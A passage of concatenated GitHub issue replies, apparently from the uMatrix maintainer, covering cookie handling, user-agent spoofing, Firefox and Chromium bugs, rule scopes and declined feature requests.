originate from other extensions. See #338.\n. Actually, uMatrix may at least be able to delete these cookies even if it is unable to intercept network requests from other extensions. uMatrix's cookie management also act as a cookie janitor and whatever cookies are stored in the browser, uMatrix will regularly process them and see if they need to be deleted -- if the option to delete cookies is checked and if a cookie is blocked as per matrix rules.\n. There is a beta version in the dev channel of uBlock Origin on AMO -- you can install from there.\n. Duplicate of #199.\n. Could be related to this: https://github.com/chrisaljoudi/uBlock/issues/955.\n. Since this is about Firefox legacy, closing -- I no longer maintain a version for Firefox legacy.. Duplicate of #46.\n. > i guess its kind of a bug since they were never even blocked tho\nNot a bug, by design. uMatrix will also take care of stale cookies which might be present, and will evaluate whether they must be deleted according to the matrix.\n. > could maybe the domain.multifox part be removed\nOf course not, that would be adding arbitrary code in uMatrix only for the sake of a very specific 3rd-party extension -- which does not exist on Chromium-based browsers. How about  creating your own rule?\n* multifox cookie allow\n. It shows only session cookies being deleted. Did you click \"Delete session cookies after [...]\"?\n. Yes, it seems to be related to #489. Sorry, I had forgotten about this entry.\n. Not a uMatrix issue, just a ruleset one.. Works from here. In any case, I can't keep changing the URL every single time there is one failure. If this is a longer term breakage I will change it.\n. My Nightly is from 2015-10-18, I will see when I receive 2015-10-20.\n. Does uBlock Origin categorize properly?\n. This is probably code at line 1831 of vapi-background.js which fails to lookup the proper request type:\nrawType = channel.loadInfo && channel.loadInfo.contentPolicyType || 1;\nSo apparently in latest Nightly, channel.loadInfo or channel.loadInfo.contentPolicyType is nil. Don't know if this is a bug in Nightly or something has changed for good and I will have to revisit that code.\n. The logger will tell you whether uBO categorizes properly. There is a column for the request type.\n. I can't test but I expect 0.9.3.0rc2 to fix the issue. Uploaded to dev channel on AMO. (Of course I did test uMatrix still work fine on Nightly 2015-10-18 and Pale Moon, so everything in between should work fine as well).\n. I see two resources with the same URL in the uMatrix screenshot, one blocked (other), one not blocked (image). If uMatrix and uBO were enabled at the same time, it's normal for uBO to not see the request blocked by uMatrix (on FF at least). If you disable uMatrix, I expect you will also get with uBO the same as with uMatrix.\n. > feature-detection to check if loadInfo.externalContentPolicyType is present instead of .contentPolicyType\nTell me if I get this right. As I understand your suggestion now, the feature-detection part would be a bit not-straightforward:\nthe HTTP observer would detect whether loadInfo.externalContentPolicyType is available, and if so would tell the content-side module (frameModule.js) through a special one-time message that there is no need to fire sync messages, in which case the content-side module would re-configure itself to no longer fire sync messages.\nOr is there another way?\n. That's code uMatrix injects when user agent-spoofing is enabled -- so that the navigator.userAgent matches the one used to spoof the User-Agent header.\n. By design. The same way uMatrix blocks outbound network requests, it blocks outbound cookies.\n. > on black background\nI see the placeholder image fine if allowing s.ytimg.com, more specifically if allowing scripts for s.ytimg.com.\n\nthan current devel. version rc2\n\nThere is no current dev build, 0.9.3.1 is the last build.\n. @seafox Yes, I can reproduce with FF. The logger says the image, located at https://i.ytimg.com/vi_webp/i3l9jxAoUp8/hqdefault.webp is not blocked. I fix the issue by disabling UA spoofing for the site. You can also keep UA spoofing enabled, but use only Firefox-related UA strings -- this is a good idea in general, as this is less likely to cause issues for web pages using UA sniffing.\n. Time passed and I am no longer sure what the specific issue is for me to fix. So closing as wontfix, and if there was anything I missed here, which is focused, specific and actionable, then please open a new issue about it.\nJust in case, re-writing the core filtering code is not something I will consider, so no point opening an issue for this.. I am not able to reproduce using FF 41.0.2.\nA similar issue was fixed with uBO (issue 248), but this one I could reproduce. Being able to reproduce the problem here is important as this would allow me to import the fix from uBO, and to confirm it works.\n. > Can you see it here: https://jsfiddle.net/vu4fvn8w/embedded/result/\nYes, this I can repro. For whatever reason, any scenario which is to open using the contextual menu, I can't repro (or middle button-click). So anyways, I can use this test case to import/test the fix.\n. Dev notes.\nThis is the pain we have to deal with on Firefox -- using above easy-to-repro case. Open the jsfiddle.net page in a tab (step 1) (allow frames for jsshell.net), then when clicking the embedded link, step 2. and beyond occur:\n1. TabContext.update: tabId=4 rawURL=\"https://jsfiddle.net/vu4fvn8w/embedded/result/\"\n2. TabContext.update: tabId=6 rawURL=\"about:blank\"\n3. TabContext.update: tabId=4 rawURL=\"http://www.google.com/\"\n4. TabContext.update: tabId=4 rawURL=\"http://www.google.ca/?[...]\"\n5. TabContext.update: tabId=4 rawURL=\"https://www.google.ca/?[...]\"\n6. TabContext.update: tabId=6 rawURL=\"https://www.google.ca/?[...]\"\n7. TabContext.update: tabId=4 rawURL=\"https://jsfiddle.net/vu4fvn8w/embedded/result/\"\nAs expected, Firefox will open a new tab (tabid === 6). But unexpectedly, it will open the link destination (google.com) in the current tab (tabid === 4) as can be seen in step 3. Eventually the destination link will be bound to the proper tab (step 6.), but the damage is done to the current tab.\n. > This was not fixed for uBO. I can still reproduce (1.3.6rc0).\nI am unable to reproduce with uBO. What are your steps to reproduce?\n. Ok, that's the one I just tried and it works fine from here.\n. @luxoflux What version of Firefox is used to reproduce the issue on your side?\n. @luxoflux I think this new block of code (committed 10 days ago) has put a nail in the coffin of that bug: it was added to improve popup blocking reliability, but it also addresses all issues where uBO was given the wrong tab id for when a new web page is opened. I brought that fix to uMatrix once I found it worked well for uBO.\n. Can't reproduce with Pale Moon 25.8.1 (x64) -- so it appears this could be specific to 26.0. Can you try to reproduce on your side with 25.8.1?\n. > open a web page in the browser, then drag that tab out into a new window\nUnrelated to the issue here. This is same as https://github.com/gorhill/uBlock/issues/1120.\n. >  https://uprootlabs.github.io/poly-flif/\nWorks fine here with default uMatrix settings.\nYou are not providing any details, thus marking as invalid as per CONTRIBUTING.\n. What version of uMatrix?\nWhat do you mean with \"all filters in uMatrix are turned off\"?\n. I tried again with uMatrix 0.9.2.1, enabled or disabled, and https://uprootlabs.github.io/poly-flif/ worked fine. What does not work exactly?\n. > * * script block\n\nuprootlabs.github.io 1st-party script allow\nuprootlabs.github.io * script allow\n\nStill works fine.\nAre you refreshing the web page after you add the uprootlabs.github.io * script allow rule?\n. > not all three at the same time\nI have difficulty following you. Let's keep it simple, give me a screenshot of the matrix while you are on the site when you say it does not work while you think it should.\n. It does not matter that a rule is permanent, uMatrix will always use temporary rules to evaluate the matrix filtering. I still cannot reproduce with your description. I have all temporary rules in my matrix, and it shows 4 scripts and 1 css. Yours is 3 scripts and 1 css. If I actually use the \"app\", i.e. select an image, there are 2 more XHR requests reported, which do not appear in your matrix. Something else is blocking these networks requests, since uMatrix is not reporting them. Look at uMatrix logger and see what is reported in there.\n\n. I am starting to wonder that you are mistaken about teh site not working. You have to select an image before starting to use the applet.\n. By the way, according to the screenshot you posted, you did not reload the page: I get exactly what you have in the screenshot if I allow 1st-party scripts but do not reload the page.\n. Hmm never mind, for some reasons now I can reproduce. Not sure what happens that I can now reproduce, I will investigate. According to the logger, inline script is no longer reported, so it appears the page is now using some cached response header with the CSP set to block inline scripts.\nCorrection: inline script was properly reported. For some reasons however, https://uprootlabs.github.io/poly-flif/flif.js was no longer reported to uMatrix.\n. Alright I am back to being unable to reproduce. Above may have occurred after I re-installed another version of uMatrix and reload the page.\nI would like other users to try to reproduce.\n. > This bug appers only if I reload page (after I change the rule) with firefox interface.\nOk, now I can reproduce at will.\n. > When I reproduced this bug, logger gave me that\nSo when using FF interface to reload, flif.js is not reported to uMatrix's HTTP observer. flif.js is creating dynamically by an inline scrip tag on the page.\nUsing Shift-reload makes the page reload properly.\nInvestigating.\n. Ok I think I understand what is going on.\nWhen FF cache the main document, it will also cache the modified headers, not the original ones. uMatrix only add CSP directives, it never removes CSP directives, so this mean that uMatrix's previously inserted CSP directive has been cached by Firefox, but uMatrix won't remove it because it should not lower whatever CSP may have been set by a web site -- uMatrix has no way to know that a specific CSP directive in the header is one it inserted itself at some earlier time.\nOn Chromium, uMatrix is always given the original headers.\nNot sure what can be done for this one. Meanwhile, Shift-reload is a workaround, or to use uMatrix's own reload button.\n. Fixed with fix to #819.. uMatrix does not use this filter list. You meant to open an issue for uBlock?\n. Duplicate of #395.\n. > Currently, it's deceiving.\nThere is nothing deceiving: the global scope shows you what happens to network requests when evaluated against the global scope, and the local scope shows you what happens to network requests when evaluated against the local scope. Without this, it would be impossible to visually create rules for a specific scope without the scope providing a visual feedback of the rules.\nYour screenshot shows without ambiguity that network requests from oxfordjournals.org for frames and plugins will be blocked by default.\n. > It seems odd that I set * 1st-party * allow, a global-scope rule, but it is only evaluated by the site scope\nYes, however its presence in the global scope is necessary, just for the sake of being able to create default 1st-party rules.\n. > Namely, after enabling the image elements AND the cookie elements of s.youtube.com (which is globally blacklisted by default), the History function works again. If you disable one of them, the History breaks again, which means that there is a weird dependence between them.\nThere is no bug. The fact that no cookies are reported in the matrix for s.youtube.com means that there are no cookies with the specific domain s.youtube.com, but this does not mean that no cookies are sent in the Cookie header of network requests to s.youtube.com: some cookies are designed to also be sent to subdomains, and it appears it is the case here -- cookies from youtube.com are also sent to s.youtube.com.\n. Can I see a screenshot of your matrix for a web page where the issue occurs?\n. Do you have uBlock Origin installed? If so, can you see if you get the same problem with the dynamic filtering pane? Normally, yandex.ru should be the first listed domain if this works fine.\n. You may want to confirm this also happens with the dev build of uMatrix, which is also available on AMO, in the developer channel.\n. >  0.9.3.0rc2 seems to work properly with the nightlies.\nOk, I think it's time for me to officially release this one, it has been release candidate forever now.\n. I pushed a new release, 0.9.3.1 -- in which spoofing of the Origin header is removed for now.\n. You're not giving any details about your browser/version.\n. If your settings were reset, it's because:\n- You install in a different path.\n- You uninstall ~~uBlock~~ uMatrix prior to install.\n- You removed/reinstalled the browser.\nI never had this problem occur before, and this was never reported, so something occurred on your side which you will need to investigate -- like try to reproduce if you think uMatrix did something wrong.\n. By the way, if the cause is because you installed in a different path (let's say you executed git clone ... in another place than usual), your settings are not lost: just be sure to call git clone ... from the usual location and restart the browser, all your settings will be back. It's the most likely mistake.\n. > So uMatrix use the extension path as a key to store my data?\nIt's Chromium/Chrome. I don't know the internal details, but by the look of it the full path is used to generate a unique id for a locally installed extension. So different full path = different extension id = different local storage. If you reuse the old full path, all your settings will be back -- at least I found it works in the short term.\n. You are not providing much details, I don't even know which browser you are using. See CONTRIBUTING.\n. https://github.com/gorhill/httpswitchboard/issues/407#issuecomment-54474067\n. uMatrix will break things, it's the default, expected behavior. I emphasize it's for advanced users because they will know how to un-break things. The repo here is to file issue/bug, i.e. unexpected behaviors as a result of bugs in the code.\nAlso, use the logger, it will tell you what got blocked.\n. I am trying to open a thread on Mozilla's Discourse to take care of user support. Will post the link if/when the thread is accepted.\n. https://discourse.mozilla-community.org/t/support-umatrix/5131\n. There is no filters in uMatrix, only rules.\n. Duplicate of #395?\n. Try dev build, it's supposed to be fixed.\n. > But i have to sync the rules between two Computers.\nI don't understand this one sentence. What do you mean exactly?\n. Ok, I guess what is happening is that the extension id on both computers is different, as you installed uMatrix manually on both computers. Sync won't work across different extensions, and the extension id is what distinguish extensions. I need to push the updated version to the Chrome store, and you need to install that version on both your computers.\n. It's now available in the Chrome store. I think the delay for review is reserved to extensions with a sizable user base.\nI will let you close the issue once you confirmed Sync works with the official release.\n. Translations are handled on Crowdin, any change needs to be done there, the translation files are pulled from there into the repo here.\n. I am still using Nightly 44.0a1 (2015-10-18). Is your version 45?\n. I reverted fix to #390 as you suggested, so I am hoping this will make the issue here disappear.\n. Can you tell me whether the last dev build (here) fix the issue?\n. > this.modernFirefox is false in the content policy\nFixed in latest dev build. Note that I still do not have the latest Nightly, so I can't tell whether bug #390 is back or not with the changes.\n. By design.\nEdit: Those per-site switches are not filters, they modify uMatrix's behavior. For example it may be useful to still strip out referrer even if filtering is off, or to enforce strict HTTP even if filtering is off.\n. Cookie headers are stripped when the cookie cell associated with a specific destination is in block mode.\nFor POST requests, are there use cases for when we want the requests to reach the server but without the content?\n. That's the way it works.\nuMatrix (and uBO) works at HTTP observer level: Firefox activates the Flash applet, and then this causes a network request to be made for the Flash resource(s).\nBy the way, I don't know how to get served Flash for Youtube, I am always served HTML5 videos. So I loaded another case (ad toward bottom of page, right), and the Flash applet was not activated (because \"Ask to Activate\"). When I clicked to activate, Flash loaded, and the network request was fired -- and blocked by uMatrix. I did not see any behind-the-scene requests for my case.\n. So possibly same as uBO issue #959? This could happens for versions of FF prior to Nightly 45. What browser was this?\n. Duplicate of #30.\n. You can export the rules to a file and then import and append from a file, in the My rules pane.\n. > But some URL-based subscription method for this doesn't exist yet\nNo. I do not intend for subscription-based model for rules, the point of these rules is that they are completely decided by the users themselves -- they override the static filters which are usually decided by someone else.\n. How did you install uMatrix?\n. > a quick walk through of how it should work is probably the first step\nuBO's doc applies: https://github.com/gorhill/uBlock/wiki/Cloud-storage, except that for uMatrix, only the My rules is cloud storage-aware.\n. Marking as invalid. See https://github.com/gorhill/uMatrix/blob/master/CONTRIBUTING.md.\n. * ad.atdmt.com doc allow?\n. Only in the code so far: https://github.com/gorhill/uMatrix/blob/master/src/js/matrix.js#L61.\nThe doc type is a \"hidden\" column in the matrix -- it would not be very useful to display it as there is only one doc request per page/frame.\nThere is a hidden rule * * doc allow. Had to come to this (hiding the rule) as often users just wiped out all the rules to start from scratch -- which meant the browser would cease connecting anywhere -- as if the connection was lost -- and issues would be opened about this.\n. > maybe on the block pages, there could be a button which would add a doc allow\nIssue #203.\n. In uBO, the dynamic filtering pane reflects you what types can be blocked: all, image, 1p-script, inline-script, 3p-script, 3p-frame.\nFor static filters, refer to ABP's doc regarding types, and uBO-specific filter options.\nFor dynamic URL filtering, what appears in the logger can be used to create dynamic URL filters.\n. I said \"dynamic URL filtering\".\n. You will have to open an issue with the Chromium project, the popup size & position is entirely under the control of the browser -- it is supposed to adjust automatically to the embedded HTML.\n. https://code.google.com/p/chromium/issues/detail?id=457887:\n\nI guess there's something wrong with the way that we resize popups on mac.\n. > So it must be related to how the popup content is formed.\n\nThe size of the matrix depends on how much stuff is reported in it. Most other extensions are static in size. But as per bug description over at the chromium project, it is a problem which affects any extension with variable size.\n. > I'll keep testing and create a pull request if it's a permanent fix.\nThis will have to be tested on Firefox, Palemoon, Seamonkey, Chromium, Opera as well to be sure there is no bad side-effect.\n. Thanks. I will create a dev build and let those who use it see if i all works fine.\n. See the big warning on the front page.\nGitHub is for issues with uMatrix itself, not issues arising from the use of uMatrix. I can't possibly assist everyone about issues arising from blocking stuff, that would no longer be a hobby.\n. Can't delete: https://github.com/isaacs/github/issues/253.\n. EasyList is not a hosts file. If you feed uMatrix random stuff, it's behavior will be undetermined.\nDuplicate of #213.\n. I can play Youtube fullscreen just fine with uMatrix enabled. Your issue is somewhere, you will have to investigate. Did you try disabling UA spoofing?\n. Those extra switches are not part of matrix filtering, hence they are not affected by the matrix-filtering switch. The tooltip for the switch does not say \"disable uMatrix\", it says \"disable matrix filtering\". One could disable matrix filtering while still wanting to enforce strict HTTPS[1], or referrer spoofing. I do not intend to change this.\n\n[1] Say you are browsing a public access point, do not have the patience to figure how to un-break a site (which is still broken after trying to toggle the all cell to allow), but still want all network requests to go through encrypted connections.\n. > if someday umatrix could sync it's settings independent of browser\nI don't plan to ever implement this, this would require this project to have a central server with sync infrastructure. I don't intend to do this. Exporting/importing through a backup file is the workaround.\n. I don't accept patch which add features.\n. uMatrix already supports cloud storage. You are asking me for a custom feature as if I was a dev for hire.\n. > I'm only asking nicely for a new feature.\nI declined -- I wish my choice of declining would be respected, not debated. Whatever I decline, I may or may not change my mind in the future.\n. It is a per site feature. The checkbox in the Privacy pane is to pick a default global setting.\n. Strict HTTPS implicitly applies only to passive contents (like images), not to active content (like scripts), because the browser will refuse in the first place to pull non-HTTPS active content resources from within a HTTPS document.\n. > Is there no way to provide a scope for a single domain level w/o sublevels?\nNo.\n. I will fix providing the URL of the blocked image as noted, but I won't fix \"pages can detect uMatrix's presence with pure CSS\": there is no such thing as [src=\"\"] when enabling the collapsing of placeholder (see) -- the src attribute is not modified in such case. Blocking stuff will always causes the DOM to be different than not blocking stuff (the error event will be raised for blocked images), it's an impossible mission to block stuff without leaving a trace, and this is also true for NoScript.\n. I gave more thoughts on this. To recapitulate:\n- Placeholders collapsed = display: none !important; style added to blocked images/frames.\n- Placeholders not collapsed = data URI assigned to src of blocked images/frames to provide the visual cue something was blocked by uMatrix (similar to what RequestPolicy does). If I remember correctly though, RequestPolicy saves the original URL into a custom data- attribute (I vaguely remember because of this).\nWhat you are asking is:\n- Placeholders not collapsed + no special visual cue uMatrix blocked something, i.e. fall back on browser's default behavior.\n. > Add a \"Shortcuts\" tab in the uMatrix Dashboard for Firefox.\nFF is moving toward WebExtensions, so it's just a matter of when I \"convert\" uMatrix to use WebExtensions, which reportedly already support the commands API.\n. Backup/restore settings from About pane in the dashboard.\n. Front page of the project:\n\nRegarding broken sites\nuMatrix does not guarantee that sites will work fine: it is for advanced users who can figure how to un-break sites, because essentially uMatrix is a firewall which works in relaxed block-all/allow-exceptionally mode out of the box: it is not unexpected that sites will break.\nSo this means do not file issues to report broken sites when the sites are broken because uMatrix does its job as expected. I will close any such issue without further comment.\n. Can you show me a screenshot of your matrix for when it does not work, prior to allowing whole www.gstatic.com domain?\n. Unfortunately the Chromium browser limits the width of extension popups -- so if an extension is wider than the max width, it will be truncated. Having an horizontal scroll bar for uMatrix does not work because  the header row is sticky.\n. I'm going to pull this to give it a try, and if it works in FF/Chromium/SeaMonkey/Chrome/Opera/PaleMoon, I will keep the pull request but it will definitely need some changes, specifically, the changing of the style property should occur if and only if it is required, because currently merely scrolling vertically (common) will cause an undesirable overhead. (I will change it, do not submit another pull request).\n. Your solution works well, I am keeping it. Thanks for contributing.\n. Duplicate of #203.\n. .> are this filters lists work in uMatrix\n\nNo, uMatrix can only process plain hostname-based filters/HOSTS file.\n. I don't tell people what to install -- it's for them to decide according to what they are trying to achieve.\n. See if this happens using the latest dev build.\n. Legacy Firefox and derivatives no longer supported.. ~~Add no-strict-blocking: * true in My rules pane in the dashboard.~~\nNever mind, I thought I was answering on uBO's project.\nDeclined.\nuMatrix is a strict blocker by nature, and making an exception to prevent blacklisted sites from being blocked is counter to the nature of the extension, and such exception would break the logic of the matrix. If you do not want a blacklisted site to be wholly blocked, just override the block rule of its whole domain using the matrix, then save changes.\n. > quietly blocked without notification to the user via main-blocked.html page.\nYou mean the browser would display whatever page it displays when a page can't be fetched?\n. > 2) Allow all elements for \"icebreaker.com\" and \"edgesuite.net\" and then refresh the page. In my tests I had elements for all other domains blocked.\n\n...\nI am submitting this as a potential bug in uMatrix because this issue does NOT manifest when I have uMatrix disabled.\n\nWouldn't it be more reasonable to first assume whatever else is still blocked on the page is causing the issue? (including also UA- and referrer-spoofing and strict HTTPS). I will let you first find out before I spend time on this.\n. > some blocked element on the page is blocking the content, then why am I able to get the content to appear by simply cycling F11?\nThe content was not blocked, the script on the page crapped because it is not prepared to deal with unforeseen events such as some 3rd-party scripts not being loaded. The modal box was in the DOM, just at a position outside the viewport. There were js errors in the console.\nicebreaker.com baynote.net script allow\nicebreaker.com facebook.net script allow\nicebreaker.com google.com script allow\nicebreaker.com twitter.com script allow\nIt was not too difficult to see that uMatrix itself was not the issue, I just set one single allow rule for all scripts with one click (internally icebreaker.com * script allow), and the modal box displayed fine. So from there it was a matter of identifying which scripts specifically.\nGoing from blocking almost everything to disable completely uMatrix without checking anything in between and conclude that there is something wrong with uMatrix is not a good way to use uMatrix, it's essentially putting the burden on me to figure whatever mix of rules unbreaks the page. Next time try to allow incrementally until it unbreaks. Also just one click on the all cell would have confirmed the page required unblocking more resources.\n. Duplicate of #83.\n. You will have to make the case that there is an issue is with uMatrix itself. I will re-open if you provide all the information substantiating that there is an issue with uMatrix.\n. Yes, as @vzjrz answered.\n. > I still believe that an option to deny cookies entirely, preventing them to enter the browser altogether, should be available.\nThis is what the early versions of HTTP Switchboard did. That does not work, for many reasons:\n1. It becomes impossible to report the accurate number of cookies in the matrix;\n2. it becomes impossible to report them in details in the logger (name/type);\n3. cookies can be set through javascript: there is no way to block the creation of cookies, the APIs to deal with cookies are asynchronous.\nThe most sensible way to deal with them is to delete them afterward, that covers all the cases, and is compatible with asynchronous APIs. There is a setting in the )Privacy_ pane in the dashboard for this.\n. Just curious: do you try to at least toggling the all cell to allow before disabling matrix filtering?\n. I am not arguing with providing a shortcut (that code is still in chromium -- disabled though), I am just asking because disabling matrix filtering for an unknown site is a rather drastic choice compared with toggling the all cell -- which at least will keep you protected from all the blacklisted domains.\n. 3rd-party filter list issue. Use the logger. Mind the prominent warning on the front page of the project.\n. I actually plan to remove the spoofing of navigator.userAgent, only the HTTP header will be spoofed. Spoofing navigator.userAgent was a mistake and does more harm than good by giving a false sense that this actually accomplishes something: this accomplishes nothing given all the bits of info which can be extracted through javascript. Preventing javascript from executing is what foils a wide class of fingerprinting techniques.\n. > Only two problems with UA spoofer that I see is this:\nAs said, only disabling javascript will properly foil a large swat of fingerprinting techniques -- UA is just one source of bits of data, there are many more, so in the end it's placebo to only spoof UA on javascript level. Best is to disable javascript -- something uMatrix does out of the box for all 3rd parties (these are the most likely to try to fingerprint you, especially the ubiquitous ones). For an even better protection, there is the Tor browser.\n. I went to bbc.co.uk and all is fine.\nCONTRIBUTING\n. The HTTP header User-Agent is changed live before leaving the browser -- it's not changed in any browser settings.\n. Read the doc, do not use the issue tracker as if it was a forum. An excerpt from front page of the project:\n\nHTTP Switchboard's documentation is still relevant, except for uMatrix's differences with HTTP Switchboard.\n. Can't reproduce.\n\nSee if there are errors in the browser console.\n. @NastyLarryDargan The scope in which a rule is created when you click is the one shown in the top-most, left-most box. By default the domain of the current page is the scope (i.e. github.com on this page). Click the that box and pick * to select the global scope. Doing so means that each rule you create will be in the global scope, i.e. apply everywhere. Don't forget to select back the local scope when you are done creating global rules.\n. What version of uMatrix was this? That issue is fixed in dev build 0.9.3.2 -- available on AMO in the dev channel.\n. I just pushed a release version of 0.9.3.2 this morning. It's pending review.\n. I could reproduce.\n. I will no longer support legacy Firefox and browsers based on legacy Firefox -- I don't have the time for such a low adoption extension on lower adoption browsers.. The switches' state are encoded on two bits -- \"chrome\" and whatever else browsers exist or may arise in the future does not fit the current implementation, and I really do not plan on rewriting all this from the ground up. Declined.\n. To implement this would require to over-complicate the code -- beyond what I find acceptable for such a narrow purpose. Best in such case is to completely disable UA spoofing in uMatrix and install a mroe specialized extension.\n. > setting \"delete blocked cookies\" doesn't help because, in my case, I'm not blocking first party cookies\nI don't understand that part.\nThe cookie from tracker.com will be deleted if it is blocked and \"Delete blocked cookies\" is checked. Are you disputing this?\nNote: I do not want Python code for POC, I want a concrete, scenario with detailed steps that I can reproduce with uMatrix.\n. The code you point at checks for \"explicitly allowed\", i.e. if there is a rule which explicitly whitelist the cookie. In such case, uBO won't delete the cookie. If the cookies on a site are indirectly whitelisted through say * 1st-party * allow, then this is not an explicit rule whiltelisting the cookie, and it will then be deleted if the cookie is blocked elsewhere.\nIt's why I need specific, detailed steps to make the case there is an issue.\n. > That's a security bug (albeit a minor one).\nDeleting an unwanted cookie is a security bug? Elaborate please.\n. > However, the code above the line I indicated seems to avoid deleting cookies that have been used as a part of a first party request. Is this not the case?\nThat part applies to web pages currently opened -- uMatrix will not delete cookies which are potentially currently used.\n. > Deleting a potentially wanted cookie because its included in a third party request.\nIf the cookie is wanted then it should be explicitly whitelisted.\nIt's why I want real world repro steps, with real sites etc. One can muster all sort of what-if-but, but that is pointless if there is no real world cases, it's just \"gotcha!\" scenarios for the sake of it -- and currently it's the only thing I see here.\n. Here is some technical aspects of wanting to prevent cookies from being set at all.\n- There is no blocking API to prevent cookies from being set, we just have notification events that a cookie has changed.\n- Removing the Set-Cookie header would prevent cookies from being set by HTTP responses, however:\n  - this means uMatrix would have to manually parse the Set-Cookie values to be able to report them in the matrix/logger.\n  - cookie parsing is not trivial, this is what early versions of HTTP Switchboard was doing, it was unreliable (this is where I learned about binary cookies), while the efficient parsing of cookies is already built-in the browser.\n  - given that Set-Cookie header can be present on every single network response, manually parsing the cookies has a good potential to become a burden, which burden is not an issue when only handling changes in cookies using the proper cookie listener API (what uMatrix does).\n  - it would still be possible to set cookies through javascript.\nI made technical choices based on real world constraints. If it would be widely deemed that cookies handling as currently done in uMatrix is completely unacceptable, I would simply remove the cookie column from the matrix and remove any sort of cookie handling in uMatrix and leave this to whatever other extensions can deal with this, if any.\n. Use the scope selector to pick in what scope the rules are created. Scope selector is top-left cell.\n. Duplicate of #221. Specifically: https://github.com/gorhill/uMatrix/issues/221#issuecomment-127582036.\n. Regarding broken sites.\n. That sort of issues being open is really tiresome. Only proved bugs/issues should be opened here, not request for support. I do warn that uMatrix is definitely for advanced users on the front page.\n\nWhy is that?\n\nAn advanced user would have already investigated all this on his own, especially using the logger. And even if I was accepting requests for support, the issue is completely lacking basic efforts to make it easy to handle.\nPlease do your home work, this sort of filed issues is a burden on any project.\n. I removed it because it needed to be refactored -- it's issue #30. The refactoring is to make it possible for contributors to provide rulesets which can be imported by users, so that I do not have to maintain these myself.\n. Duplicate of #30.. > Is there a way?\nNo, uMatrix's rules are hostname-based at most.\n. Page deleted. There is nothing to say really: whoever is advanced enough to use uMatrix is able to understand where uBlock Origin and uMatrix overlap, and decide how to configure both extensions in such case.\n. I do not intend to turn uMatrix into a full blown cookie manager. There are specialized extensions out there for this.\n. Thanks.\n. No.\n. uMatrix's purpose is to filter network requests, not DOM elements.\n. Check \"Enable cloud storage support\" in the dashboard.\n. > some years ago unfortunately\nLocking issue due to noise.\n. You can import file:/// URLs with Chromium.\nYou can't (at least yet) with Firefox -- there is an issue on bugzilla about this.. Duplicate of #302.. A different solution has been implemented: e21f87a5f663c8174c424ef7b5f6a1d8b22aae84 (I did not realize there was an issue for this).\n. uMatrix will count all the embedded scripts as one script -- but there is no script tags on that page.\n. Works fine on my side with FF 47/Chromium 50, with a blocked script column -- there is no script for that page.\n. I see, we are talking about the drop-down lists under the diff options section -- thought it was about the diff pane itself.\n. Though uMatrix will take into account script tags, the case here is that there are no script tags, however there are embedded event handlers, which are not taken into account: <select name='h' onchange='this.form.submit();'>. uMatrix needs to look for these too.\n. Ultimately, there is a missing API browser-side for uMatrix to account reliably of any sort of inline script code on a page. Without such API, it's impossible to guarantee that uMatrix will always report 100% of the time that inline javascript is being executed on the page.\nNoScript uses report-to/report-uri, and this is a good idea to solve the problem. This would allow uMatrix to report 100% reliably when inline script code is trying to execute on a page. However for this to work there needs to be a fake URL to which the report is sent, and one has to worry that such fake URL requests do not end up leaving the browser, and I rather avoid such a questionable detour for what is merely a one bit of information in the case of uMatrix. This also creates \"noise\" on the webRequest API handlers of other extensions.\nWith an API such as webRequest.onCSPViolationOccurred, there would be no need to such a complicated detour to simply access a trivial piece of information.. > Is there a way to do this blocking silently in the background without losing the page that I am on?\nI can't make sense of this feature request. If uMatrix silently prevents navigation to a site, the user won't have any clue why this is the case. That page is there to inform of why the navigation is being blocked.. > provides a preference for layout.css.visited_links_enabled false/true?\nNo. I do not plan supporting this, too far removed from dealing with network requests.\n\ncontrol of some kind over plugin announcements\n\nI don't understand that part. You mean plug-in enumeration? uBO/uMatrix has no mechanism to foil this -- best left to a specialized extension.\n. You do not provide any details about your rules -- I can't even start to investigate without this. Also, I need to know your FF setting regarding 3rd-party cookies.\n. I try to reproduce and see nothing wrong. I would like that you find exact repro steps that focuses only with one site. Provide the ruleset for that one site + the cookie-related settings in uMatrix. Also, any other extension installed which deals with cookies?\n. I tested the Remove all button in Firefox's Preferences page, and I confirm uMatrix does not clear its internal database of cookies. I will need to add code to do so. Looking at the code, it looks like this is also an issue for the Chromium port.\n. Looks like it's probably the same issue.\n. An interesting observation concerning Firefox's cookie settings... If one select \"Keep until: I close Firefox\", then all cookies become session cookies, including cookies which intended purpose is to be persistent.\n. My mistake: e9e1f7e631c96c23a8ca1061f714eeec0a2da830 solves #385, not this one here. I still need to make uBO aware of cookies removed by some external methods. \n. Good idea, thanks.\n. Closing and marking as invalid, as per CONTRIBUTING.\n. Please do not use issue trackers as replacement for a forum.\n. Anybody can answer, it does not have to be me.\n. You say you deactivated uMatrix for softlayer.com, so why would you expect uMatrix to also be deactivated for sales.liveperson.net? Just also deactivate uMatrix for sales.liveperson.net (or preferably figure the ruleset to make it work).\n. Closing and marking as invalid, as per CONTRIBUTING.\n. Likely a 3rd-party filter list issue anyways.\n. Front page of the project:\n\n[Do] not file issues to report broken sites when the sites are broken because uMatrix does its job as expected.\n. > instead it happens only with both enabled\n\nThat is absolutely not an indication there is something wrong with uMatrix. A good case need to be made first, and the issue not occurring when disabling uMatrix is not a good case -- a timing issue could be involved. Currently I see this as sending me on a quest to prove that uMatrix is not the issue.\n. I should just import uBlock Origin's code for handling the parsing of the URL parameters. I won't ever implement automatic skipping, because that is too arbitrary, but at least users will be able to click themselves on whatever they think is the real destination URL in the parsed parameters (if any).\n. https://github.com/gorhill/uMatrix/wiki/How-to-get-past-%22uMatrix-has-prevented-the-following-page-from-loading%22#bypass-redirects. Unable to reproduce. You will have to make a better case that this is a uMatrix issue -- and a requirement for making a case is to provide way more details -- and that include provide a URL. See CONTRIBUTING.\n. > url is irrelvent because it happens in all videos.\nIt's not irrelevant:\n- it prevents me to go on a quest to find a video -- providing a URL which I can just click is being considerate;\n- it makes 100% sure that whatever the issue is, it's not with the specific video -- I don't care that you can reproduce it with any video, I want the specific video with which you did reproduce it.\n. It's by design, page reload do not cause the matrix to reset. For a given web page in a given tab, the matrix is reset a few minutes after the page has been unloaded. This is to be sure that all the places where a page caused the browser to connect are reported in the matrix, we wouldn't want information of rare instances of connection to be flushed away on a mere page reload.\n. You can already go to the dashboard by clicking that bar.\n. > Should I open a separate issue \nNo, I would decline and close the issue. There is such a thing as settings bloat, and this would qualify.\n. The idea is appealing. But then I considered:\n- the overhead required to obtain that granular information each time the icon badge has to be updated;\n- user settings creep.\n. Will close after one day if no precise steps are provided to reproduce the filed issue.\n. Did you turn off cookie deletion after visiting the sites for which you say the cookies were deleted?\n. Never mind, I see 